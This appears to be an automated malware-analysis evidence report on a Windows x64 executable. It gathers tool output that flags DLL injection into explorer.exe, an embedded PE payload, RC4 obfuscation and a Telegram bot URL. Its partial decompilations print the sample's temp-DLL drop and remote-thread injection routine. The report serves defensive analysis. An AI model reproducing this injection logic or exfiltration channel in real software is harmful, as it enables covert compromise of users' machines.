## Tool evidence (stage=deep_dive, signal-prioritized)
<!-- stage: deep_dive | sha=28ea44a49cb4277e | packaging=v6.1 -->

## MalCat evidence
  File: type=PE, architecture=X64, entropy=98, sha256=28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
  Anomalies (5): BssNonEmpty (entropy), EmbeddedProgram (embedding), GuiSubsystemNoWindowApi (headers), InvalidSizeOfInitializedData (sections), XorInLoop (code)
  High-signal anomaly locations: GuiSubsystemNoWindowApi@220; XorInLoop@8765
  YARA (info, 1 total): EnumerateProcesses
  Functions (15): sub_140002be0@8672, sub_140001550@2896, sub_140001af0@4336, sub_140002187@6023, sub_1400022d0@6352, sub_14000210c@5900, sub_140002230@6192, sub_140001037@1591, sub_1400014b0@2736, 0@3936, EntryPoint@2624, 1@3904, jmp_api-ms-win-crt-string-l1-1-0._stricmp@8080, jmp_api-ms-win-crt-string-l1-1-0.memset@8088, jmp_api-ms-win-crt-string-l1-1-0.strlen@8096
  Top high-signal imports (score≥8, 5 of 66):
    [10] kernel32.CreateRemoteThread ×2
    [10] kernel32.WriteProcessMemory ×2
    [10] kernel32.VirtualAllocEx
    [8] kernel32.VirtualProtect ×2
    [8] kernel32.CreateToolhelp32Snapshot
  Mid-signal imports: kernel32.OpenProcess, kernel32.DeleteFileW, kernel32.GetProcAddress, kernel32.CreateFileW, kernel32.GetModuleHandleA
  (low-signal/noise imports: 56 omitted)
  Strings/urls (1 total): https://api.telegram.org/bot
  Strings/paths (2 total): C:\Windows\System32\curl.exe, D:\W\B\src\build-UCRT64
  Strings/apis (1 total): LoadLibraryW
  Strings (other, 296 items, omitted)
  Carved files (1): PE@9760 (342016 bytes)
  Virtual files (1): MANIF/1/unk
  Recovered structures (43): MZ, PE, OptionalHeader, Sections, TlsDirectory, TlsCallbacks, ExceptionTable, ImportTable, kernel32.OFT, api-ms-win-crt-environment-l1-1-0.OFT, api-ms-win-crt-heap-l1-1-0.OFT, api-ms-win-crt-locale-l1-1-0.OFT, api-ms-win-crt-math-l1-1-0.OFT, api-ms-win-crt-private-l1-1-0.OFT, api-ms-win-crt-runtime-l1-1-0.OFT
  Decompilations (3 top functions):
    ### 8672 (sub_140002be0, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 sub_140002be0(void)

{
    char *pcVar1;
    bool bVar2;
    bool bVar3;
    bool bVar4;
    code *pcVar5;
    code *pcVar6;
    code *pcVar7;
    undefined4 uVar8;
    int32_t iVar9;
    int64_t iVar10;
    int64_t iVar11;
    int64_t iVar12;
    undefined8 uVar13;
    int64_t iVar14;
    char **ppcVar15;
    char cVar16;
    uint32_t uVar17;
    char *pcVar18;
    undefined4 uVar19;
    undefined8 in_stack_fffffffffffffb78;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [392];
    undefined8 uStack_b0;
    undefined auStack_88 [60];
    uint8_t uStack_4c;
    undefined2 uStack_48;
    
    bVar3 = false;
    bVar2 = false;
    uStack_b0 = 0x140002bf1;
    func_0x000140001910();
    uStack_b0 = 0x140002bf6;
    ppcVar15 = jmp_api-ms-win-crt-runtime-l1-1-0.__p__acmdln();
    pcVar6 = kernel32.IsDBCSLeadByte;
    uVar19 = in_stack_fffffffffffffb78 >> 0x20;
    pcVar18 = *ppcVar15;
    if (pcVar18 == 0x0) {
        pcVar18 = "";
    }
    else {
code_r0x000140002c10:
        cVar16 = *pcVar18;
        if (' ' < cVar16) goto code_r0x000140002c3d;
        while (uVar19 = in_stack_fffffffffffffb78 >> 0x20, cVar16 != '\0') {
            if (!bVar2) goto code_r0x000140002c64;
            uStack_b0 = 0x140002c22;
            iVar9 = (*pcVar6)();
            pcVar1 = pcVar18;
            while( true ) {
                pcVar18 = pcVar1 + 1;
                if ((iVar9 == 0) || (pcVar1[1] == '\0')) goto code_r0x000140002c10;
                cVar16 = pcVar1[2];
                pcVar18 = pcVar1 + 2;
                if (cVar16 < '!') break;
code_r0x000140002c3d:
                bVar4 = bVar2 ^ 1;
                bVar2 = bVar3;
                if (cVar16 == '\"') {
                    bVar2 = bVar4;
                }
                uStack_b0 = 0x140002c4a;
                iVar9 = (*pcVar6)();
                pcVar1 = pcVar18;
                bVa
```
    ### 2896 (sub_140001550, score=?)
```c
/* DISPLAY WARNING: Type casts are NOT being printed */

undefined8 sub_140001550(void)

{
    code *pcVar1;
    code *pcVar2;
    code *pcVar3;
    int32_t iVar4;
    undefined4 uVar5;
    int64_t iVar6;
    int64_t iVar7;
    int64_t iVar8;
    undefined8 uVar9;
    int64_t iVar10;
    uint32_t uVar11;
    undefined8 in_stack_fffffffffffffb78;
    undefined4 uVar12;
    undefined uStack_44d;
    undefined auStack_44c [4];
    undefined auStack_448 [528];
    undefined auStack_238 [536];
    
    uVar12 = in_stack_fffffffffffffb78 >> 0x20;
    iVar4 = (*kernel32.GetTempPathW)(0x104, auStack_448);
    if (iVar4 != 0) {
        iVar4 = (*kernel32.GetTempFileNameW)(auStack_448, 0x140071000, 0, auStack_238);
        if (iVar4 == 0) {
            (*kernel32.GetCurrentDirectoryW)(0x104, auStack_448);
            uVar5 = (*kernel32.GetTickCount)();
            uVar9 = CONCAT44(uVar12, uVar5);
            (*0x140070850)(auStack_238, 0x104, "%s\\dl%lu.dll", auStack_448, uVar9);
            uVar12 = uVar9 >> 0x20;
        }
        pcVar2 = kernel32.CreateFileW;
        iVar6 = (*kernel32.CreateFileW)(auStack_238, 0x40000000, 0, 0, CONCAT44(uVar12, 2), 0x80, 0);
        pcVar3 = kernel32.WriteFile;
        if (iVar6 != -1) {
            uVar12 = 0;
            (*kernel32.WriteFile)(iVar6, 0x140003020, [0x0x140003000], auStack_44c, 0);
            pcVar1 = kernel32.CloseHandle;
            (*kernel32.CloseHandle)(iVar6);
            iVar4 = sub_1400014b0("explorer.exe");
            if (iVar4 != 0) {
                iVar6 = (*kernel32.OpenProcess)(0x43a, 0, iVar4);
                if (iVar6 != 0) {
                    iVar7 = jmp_api-ms-win-crt-string-l1-1-0.wcslen(auStack_238);
                    iVar7 = iVar7 * 2 + 2;
                    uVar9 = CONCAT44(uVar12, 4);
                    iVar8 = (*kernel32.VirtualAllocEx)(iVar6, 0, iVar7, 0x3000, uVar9);
                    uVar12 = uVar9 >> 0x20;
                    if (iVar8 != 0) {
                        (*kernel32.Write
```
    ### 4336 (sub_140001af0, score=?)
```c
/* WARNING: Possible PIC construction at 0x000140001c77: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001cac: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001e40: Changing call to branch */
/* WARNING: Possible PIC construction at 0x00014000204e: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001dde: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140002005: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001f61: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001f04: Changing call to branch */
/* WARNING: Removing unreachable block (ram,0x000140001f66) */
/* WARNING: Removing unreachable block (ram,0x00014000200a) */
/* WARNING: Removing unreachable block (ram,0x000140001de3) */
/* WARNING: Removing unreachable block (ram,0x000140001e45) */
/* WARNING: Removing unreachable block (ram,0x000140001e5b) */
/* WARNING: Removing unreachable block (ram,0x000140001cb5) */
/* WARNING: Removing unreachable block (ram,0x000140001cf0) */
/* WARNING: Removing unreachable block (ram,0x000140001d49) */
/* WARNING: Removing unreachable block (ram,0x000140001ec0) */
/* WARNING: Removing unreachable block (ram,0x000140001ec8) */
/* WARNING: Removing unreachable block (ram,0x00014000202b) */
/* WARNING: Removing unreachable block (ram,0x000140002036) */
/* WARNING: Removing unreachable block (ram,0x000140001d53) */
/* WARNING: Removing unreachable block (ram,0x000140001d5d) */
/* WARNING: Removing unreachable block (ram,0x000140001ed5) */
/* WARNING: Removing unreachable block (ram,0x000140001ede) */
/* WARNING: Removing unreachable block (ram,0x000140001d68) */
/* WARNING: Removing unreachable block (ram,0x000140002053) */
/* WARNING: Removing unreachable block (ram,0x000140002070) */
/* WARNING: Removing unreachable block (ram,0x000140002099) */
/* WARNING: Removing unreachable block (ram,0x000140001d74) */
/* WA
```

## capa evidence (17 total, showing top 15)
  ATT&CK {'parts': ['Execution', 'Shared Modules'], 'tactic': 'Execution', 'technique': 'Shared Modules', 'subtechnique': '', 'id': 'T1129'} (2): link function at runtime on Windows, parse PE header
  ATT&CK {'parts': ['Defense Evasion', 'Obfuscated Files or Information'], 'tactic': 'Defense Evasion', 'technique': 'Obfuscated Files or Information', 'subtechnique': '', 'id': 'T1027'} (1): encrypt data using RC4 PRGA
  ATT&CK {'parts': ['Discovery', 'File and Directory Discovery'], 'tactic': 'Discovery', 'technique': 'File and Directory Discovery', 'subtechnique': '', 'id': 'T1083'} (1): get common file path
  ATT&CK {'parts': ['Defense Evasion', 'Process Injection', 'Thread Execution Hijacking'], 'tactic': 'Defense Evasion', 'technique': 'Process Injection', 'subtechnique': 'Thread Execution Hijacking', 'id': 'T1055.003'} (1): inject thread
  ATT&CK {'parts': ['Defense Evasion', 'Reflective Code Loading'], 'tactic': 'Defense Evasion', 'technique': 'Reflective Code Loading', 'subtechnique': '', 'id': 'T1620'} (1): inject thread
  ATT&CK {'parts': ['Discovery', 'Process Discovery'], 'tactic': 'Discovery', 'technique': 'Process Discovery', 'subtechnique': '', 'id': 'T1057'} (1): enumerate processes
  ATT&CK {'parts': ['Discovery', 'Software Discovery'], 'tactic': 'Discovery', 'technique': 'Software Discovery', 'subtechnique': '', 'id': 'T1518'} (1): enumerate processes
  ATT&CK {'parts': ['Defense Evasion', 'Process Injection', 'Dynamic-link Library Injection'], 'tactic': 'Defense Evasion', 'technique': 'Process Injection', 'subtechnique': 'Dynamic-link Library Injection', 'id': 'T1055.001'} (1): inject dll
  All rules (8): contain an embedded PE file, delete file, write file on Windows, allocate or change RWX memory, terminate process, create thread, enumerate PE sections, execute shellcode via indirect call

## pe_imports (66 imports, 5 high-signal)
  allocate_memory (VirtualAllocEx) [T1055]
  write_process_memory (WriteProcessMemory) [T1055]
  create_remote_thread (CreateRemoteThread) [T1055]
  get_proc_address (GetProcAddress) [T1129]
  change_memory_protection (VirtualProtect) [T1055]

## YARA matches (12)
  Rules: domain, spyeye, IP, contains_base64, url, IsPE64, IsWindowsGUI, HasOverlay, SEH__v4, inject_thread, screenshot, win_mutex

## FLOSS strings (7006 total)
  (other strings, 80 items omitted)

## dotnet_analyze
  (not a .NET assembly)


## radare2 (pdf (disasm)) — 5 functions (asm)
  ### 0x140001440
```c
╎   ;-- WinMainCRTStartup:
┌ 18: entry0 ();
│       ╎   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090
│       ╎   0x140001447      c70001000000   mov dword [rax], 1
└       └─< 0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup  ; synchapi.h:138:0
```
  ### 0x140001000
```c
;-- section..text:
            ; DATA XREF from sym.__tmainCRTStartup @ 0x1400011a0(r)
┌ 1: sym.__mingw_invalidParameterHandler ();
└           0x140001000      c3             ret                        ; synchapi.h:88:0 ; [00] -r-x section size 8192 named .text
```
  ### 0x140001010
```c
; DATA XREF from sym.__tmainCRTStartup @ 0x14000139c(r)
┌ 31: sym.cpp_unhandled_exception_filter (int64_t arg1);
│           ; arg int64_t arg1 @ rcx
│           0x140001010      31d2           xor edx, edx               ; synchapi.h:103:0
│           0x140001012      488b09         mov rcx, qword [rcx]       ; synchapi.h:118:0 ; arg1
│           0x140001015      8b01           mov eax, dword [rcx]       ; arg1
│           0x140001017      25ffffff20     and eax, 0x20ffffff
│           0x14000101c      3d43434720     cmp eax, 0x20474343        ; 'CCG '
│       ┌─< 0x140001021      7509           jne 0x14000102c
│       │   0x140001023      8b5104         mov edx, dword [rcx + 4]   ; synchapi.h:119:0 ; arg1
│       │   0x140001026      83e201         and edx, 1
│       │   0x140001029      83ea01         sub edx, 1                 ; synchapi.h:118:0
│       └─> 0x14000102c      89d0           mov eax, edx               ; synchapi.h:123:0
└           0x14000102e      c3             ret
```
  ### 0x140001030
```c
; DATA XREF from sym.__tmainCRTStartup @ 0x140001185(r)
┌ 7: sym.safe_flush ();
│           0x140001030      31c9           xor ecx, ecx               ; synchapi.h:127:0
└       ┌─< 0x140001032      e9b1190000     jmp sym.fflush             ; synchapi.h:129:0
```
  ### 0x140001040
```c
┌ 980: sym.__tmainCRTStartup (int64_t arg_1h);
│           ; arg int64_t arg_1h @ rbp+0x1
│           ; var int64_t var_20h @ rsp+0x20
│           ; var int64_t var_3ch @ rsp+0x3c
│           ; var int64_t var_4ch @ rsp+0x4c
│           0x140001040      4157           push r15                   ; synchapi.h:157:0
│           0x140001042      4156           push r14
│           0x140001044      4155           push r13
│           0x140001046      4154           push r12
│           0x140001048      55             push rbp
│           0x140001049      57             push rdi
│           0x14000104a      56             push rsi
│           0x14000104b      53             push rbx
│           0x14000104c      4883ec58       sub rsp, 0x58
│           0x140001050      65488b0425..   mov rax, qword gs:[0x30]   ; synchapi.h:167:0
│           0x140001059      488b7008       mov rsi, qword [rax + 8]   ; synchapi.h:175:0
│           0x14000105d      488b1dec03..   mov rbx, qword [0x140071450] ; synchapi.h:176:0 ; [0x140071450:8]=0x140074040
│           0x140001064      488b3d6543..   mov rdi, qword [sym.imp.KERNEL32.dll_Sleep] ; synchapi.h:187:0 ; [0x1400753d0:8]=0x7572c reloc.KERNEL32.dll_Sleep ; ",W\a"
│       ┌─< 0x14000106b      eb13           jmp 0x140001080            ; synchapi.h:179:0
..
│      ┌──> 0x140001070      4839c6         cmp rsi, rax               ; synchapi.h:182:0
│     ┌───< 0x140001073      0f84af000000   je 0x140001128
│     │╎│   0x140001079      b9e8030000     mov ecx, 0x3e8             ; synchapi.h:187:0 ; 1000
│     │╎│   0x14000107e      ffd7           call rdi
│     │╎│   ; CODE XREF from sym.__tmainCRTStartup @ 0x14000106b(x)
│     │╎└─> 0x140001080      31c0           xor eax, eax               ; synchapi.h:180:0
│     │╎    0x140001082      f0480fb133     lock cmpxchg qword [rbx], rsi
│     │└──< 0x140001087      75e7           jne 0x140001070
│     │     0x140001089      4531f6         xor r14d, r14d             ; synchapi.h:176:0
│     │     ; CODE XREF from sym.__tmainCRTStartup @ 0x14000112e(x)
│     │ ┌─> 0x14000108c      4c8b25cd03..   mov r12, qword [str.H__a_] ; synchapi.h:189:0 ; [0x140071460:8]=0x140074048 ; "H@\a@\x01"
│     │ ╎   0x140001093      41833c2401     cmp dword [r12], 1
│     │┌──< 0x140001098      0f848c030000   je 0x14000142a
│     ││╎   0x14000109e      458b1c24       mov r11d, dword [r12]      ; synchapi.h:193:0
│     ││╎   0x1400010a2      4585db         test r11d, r11d
│    ┌────< 0x1400010a5      0f84b50000
```

## UPX
  (not packed)


## xorsearch (2 candidates)
  Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r
  Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r

<!-- evidence_assembler: used 15171/60000 chars across 9 tools -->